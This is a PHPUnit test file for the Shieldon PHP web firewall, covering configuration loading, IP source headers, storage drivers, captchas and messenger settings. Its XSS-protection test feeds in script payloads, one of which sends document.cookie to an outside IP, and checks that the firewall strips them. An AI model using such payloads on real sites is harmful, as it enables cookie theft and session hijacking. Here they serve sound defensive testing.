<?php declare(strict_types=1);
/*
 * This file is part of the Shieldon package.
 *
 * (c) Terry L. <contact@terryl.in>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace Shieldon;


class FirewallTest extends \PHPUnit\Framework\TestCase
{

    public function testFromJsonConfig()
    {
        // Remove the configration file if it exists.
        if (file_exists(BOOTSTRAP_DIR . '/../tmp/shieldon/config.firewall.json')) {
            unlink(BOOTSTRAP_DIR . '/../tmp/shieldon/config.firewall.json');
        }

        $firewall = new \Shieldon\Firewall(BOOTSTRAP_DIR . '/../tmp/shieldon');

        // setChannel()
        $firewall->setConfig('channel_id', 'test_firewall');
        $firewall->getShieldon()->driver->rebuild();
        $firewall->getShieldon()->setStrict(false);

        // Action Logger
        $firewall->setConfig('loggers.action.config.directory_path', BOOTSTRAP_DIR . '/../tmp/shieldon/logs');
        $firewall->setup();


        // Get Firewall from Container.
        $firewall = \Shieldon\Container::get('firewall');
        $shieldon = \Shieldon\Container::get('shieldon');

        $firewall->getShieldon()->setIp('141.11.72.12');

        $reflection = new \ReflectionObject($shieldon);
        $methodSetSessionId = $reflection->getMethod('setSessionId');
        $methodSetSessionId->setAccessible(true);
        $methodSetSessionId->invokeArgs($shieldon, [md5(date('YmdHis') . mt_rand(1, 1000))]);
    }

    public function testXssProtection()
    {
        $this->testFromJsonConfig();

        $firewall = \Shieldon\Container::get('firewall');
        $firewall->getShieldon()->driver->rebuild();

        $firewall->getShieldon()->setIp('131.122.87.32');
        

        /*
        |--------------------------------------------------------------------------
        | Xss-Protection
        |--------------------------------------------------------------------------
        */

        // Test Xss-Protection options
        $_POST['test_one'] = '<script> alert(); </script>';
        $_COOKIE['test_two'] = '<script src="http://19.89.6.4/xss.js">';
        $_GET['test_three'] = '<script>new Image().src="http://19.89.6.4/test.php?output="+document.cookie;</script>';

        $firewall->run();

        $this->assertEquals($_POST['test_one'], '[removed] alert&#40;&#41;; [removed]');
        $this->assertEquals($_COOKIE['test_two'], '[removed]');
        $this->assertEquals($_GET['test_three'], '[removed]new Image().src="http://19.89.6.4/test.php?output="+[removed];[removed]');
     
        // Test Xss-Protection signle variable.
        $firewall->setConfig('xss_protection.post', false);
        $firewall->setConfig('xss_protection.cookie', false);
        $firewall->setConfig('xss_protection.get', false);

        $_POST['_test'] = '<script> alert(123); </script>';
        $_COOKIE['_test'] = '<script> alert(123); </script>';
        $_GET['_test'] = '<script> alert(123); </script>';

        $firewall->getShieldon()->setIp('140.132.72.12');

        $firewall->setup();
        $firewall->run();

        $this->assertEquals($_GET['_test'], '[removed] alert&#40;123&#41;; [removed]');
        $this->assertEquals($_POST['_test'], '[removed] alert&#40;123&#41;; [removed]');
        $this->assertEquals($_COOKIE['_test'], '[removed] alert&#40;123&#41;; [removed]');

        $firewall->setConfig('xss_protection.post', true);
        $firewall->setConfig('xss_protection.cookie', true);
        $firewall->setConfig('xss_protection.get', true);
    }

    public function testImageCaptchaOption()
    {
        $this->testFromJsonConfig();

        $firewall = \Shieldon\Container::get('firewall');
        $firewall->getShieldon()->driver->rebuild();

        $firewall->getShieldon()->setIp('131.122.87.9');

        /*
        |--------------------------------------------------------------------------
        | Test Image captcha options.
        |--------------------------------------------------------------------------
        */
        $firewall->setConfig('captcha_modules.image.config.type', 'alpha');
        $firewall->setup();
        $firewall->run();

        $firewall->getShieldon()->setIp('140.112.172.93');

        $firewall->setConfig('captcha_modules.image.config.type', 'numeric');
        $firewall->setup();
        $firewall->run();
    
    }

    public function testIpSourceOption()
    {
        $this->testFromJsonConfig();
        $firewall = \Shieldon\Container::get('firewall');
        $firewall->getShieldon()->driver->rebuild();

        $firewall->getShieldon()->setIp('131.132.87.12');

        /*
        |--------------------------------------------------------------------------
        | IP Source
        |--------------------------------------------------------------------------
        */

        // HTTP_CF_CONNECTING_IP
        $firewall->setConfig('ip_variable_source.REMOTE_ADDR', false);
        $firewall->setConfig('ip_variable_source.HTTP_CF_CONNECTING_IP', true);
        $firewall->setConfig('ip_variable_source.HTTP_X_FORWARDED_FOR', false);
        $firewall->setConfig('ip_variable_source.HTTP_X_FORWARDED_HOST', false);

        $_SERVER['HTTP_CF_CONNECTING_IP'] = '19.89.6.4';
        $firewall->setup();
        $firewall->run();

        $this->assertEquals($firewall->getShieldon()->getIp(), '19.89.6.4');

        // HTTP_X_FORWARDED_FOR
        $firewall->setConfig('ip_variable_source.REMOTE_ADDR', false);
        $firewall->setConfig('ip_variable_source.HTTP_CF_CONNECTING_IP', false);
        $firewall->setConfig('ip_variable_source.HTTP_X_FORWARDED_FOR', true);
        $firewall->setConfig('ip_variable_source.HTTP_X_FORWARDED_HOST', false);

        $_SERVER['HTTP_X_FORWARDED_FOR'] = '19.80.4.12';
        $firewall->setup();
        $firewall->run();

        $this->assertEquals($firewall->getShieldon()->getIp(), '19.80.4.12');

        // HTTP_X_FORWARDED_HOST
        $firewall->setConfig('ip_variable_source.REMOTE_ADDR', false);
        $firewall->setConfig('ip_variable_source.HTTP_CF_CONNECTING_IP', false);
        $firewall->setConfig('ip_variable_source.HTTP_X_FORWARDED_FOR', false);
        $firewall->setConfig('ip_variable_source.HTTP_X_FORWARDED_HOST', true);

        $_SERVER['HTTP_X_FORWARDED_HOST'] = '5.20.13.14';
        $firewall->setup();
        $firewall->run();

        $this->assertEquals($firewall->getShieldon()->getIp(), '5.20.13.14');
    }

    public function testDataDriverOption()
    {
        $this->testFromJsonConfig();
        $firewall = \Shieldon\Container::get('firewall');
        $firewall->getShieldon()->driver->rebuild();
        

        /*
        |--------------------------------------------------------------------------
        | Drivers
        |--------------------------------------------------------------------------
        */

        // SQLite
        $firewall->setConfig('driver_type', 'sqlite');
        $firewall->setConfig('drivers.sqlite.directory_path', BOOTSTRAP_DIR . '/../tmp/shieldon');
        
        $firewall->getShieldon()->setIp(rand_ip());
        $firewall->setup();
        $firewall->run();
        
        // Redis
        $firewall->setConfig('driver_type', 'redis');
        $firewall->getShieldon()->setIp(rand_ip());
        $firewall->setup();
        $firewall->run();
         
        // MySQL
        $firewall->setConfig('driver_type', 'mysql');
        $firewall->getShieldon()->setIp(rand_ip());
        $firewall->setup();
        $firewall->run();
    }

    public function testDataDriverOptionSqliteEmpty()
    {
        $this->testFromJsonConfig();
        $firewall = \Shieldon\Container::get('firewall');
        $firewall->getShieldon()->driver->rebuild();

        $firewall->setConfig('driver_type', 'sqlite');
        $firewall->setConfig('drivers.sqlite.directory_path', '');

        $firewall->getShieldon()->setIp(rand_ip());
        $firewall->setup();
   
        $reflection = new \ReflectionObject($firewall);
        $t = $reflection->getProperty('status');
        $t->setAccessible(true);
        $firewallStatus = $t->getValue($firewall);

        $this->assertFalse($firewallStatus);
    }

    public function testSetCronJobOption()
    {
        $this->testFromJsonConfig();
        $firewall = \Shieldon\Container::get('firewall');
        $firewall->getShieldon()->driver->rebuild();
        
        /*
        |--------------------------------------------------------------------------
        | setCronJob()
        |--------------------------------------------------------------------------
        */

        $firewall->getShieldon()->setIp('131.111.11.114');
        $shieldon = $firewall->getShieldon();

        // Set a fake session to avoid occuring errors.
        
        $reflection = new \ReflectionObject($shieldon);
        $methodSetSessionId = $reflection->getMethod('setSessionId');
        $methodSetSessionId->setAccessible(true);
        $methodSetSessionId->invokeArgs($shieldon, [md5(date('YmdHis') . mt_rand(1, 1000))]);

        $firewall->setConfig('cronjob.reset_circle.config.last_update', '');
        $firewall->setup();
        $firewall->run();
    }

    public function testRestfulOption()
    {
        $this->testFromJsonConfig();
        $firewall = \Shieldon\Container::get('firewall');

        // Test method restful();
        $firewall->restful();

        $reflection = new \ReflectionObject($firewall);
        $methodSetSessionId = $reflection->getMethod('restful');
        $methodSetSessionId->setAccessible(true);

        $reflection = new \ReflectionObject($firewall);
        $p1 = $reflection->getProperty('restful');
        $p1->setAccessible(true);
        
        $restful = $p1->getValue($firewall);
       
        $this->assertTrue($restful);
    }

    public function testFromPhpPConfig()
    {
        $config = include(BOOTSTRAP_DIR . '/config.php');
        $firewall = new \Shieldon\Firewall($config);

        // Get Firewall from Container.
        $firewall = \Shieldon\Container::get('firewall');
        $shieldon = \Shieldon\Container::get('shieldon');

        $shieldon->setIp('131.111.11.115');
        $reflection = new \ReflectionObject($shieldon);
        $methodSetSessionId = $reflection->getMethod('setSessionId');
        $methodSetSessionId->setAccessible(true);
        $methodSetSessionId->invokeArgs($shieldon, [md5(date('YmdHis') . mt_rand(1, 1000))]);

        $firewall->run();
    }

    public function testSetMessengers()
    {
        $this->testFromJsonConfig();
        $firewall = \Shieldon\Container::get('firewall');
        
        $firewall->setConfig('messengers.telegram.enable', true);
        $firewall->setConfig('messengers.telegram.confirm_test', true);

        $firewall->setConfig('messengers.line_notify.enable', true);
        $firewall->setConfig('messengers.line_notify.confirm_test', true);

        $firewall->setConfig('messengers.sendgrid.enable', true);
        $firewall->setConfig('messengers.sendgrid.confirm_test', true);

        $firewall->setConfig('messengers.native_php_mail.enable', true);
        $firewall->setConfig('messengers.native_php_mail.confirm_test', true);

        $firewall->setConfig('messengers.smtp.enable', true);
        $firewall->setConfig('messengers.smtp.confirm_test', true);

        $firewall->setConfig('messengers.mailgun.enable', true);
        $firewall->setConfig('messengers.mailgun.confirm_test', true);

        $firewall->setConfig('messengers.rocket_chat.enable', true);
        $firewall->setConfig('messengers.rocket_chat.confirm_test', true);

        $firewall->setConfig('messengers.slack.enable', true);
        $firewall->setConfig('messengers.slack.confirm_test', true);

        $firewall->setConfig('messengers.slack_webhook.enable', true);
        $firewall->setConfig('messengers.slack_webhook.confirm_test', true);

        $firewall->setup();
    }
}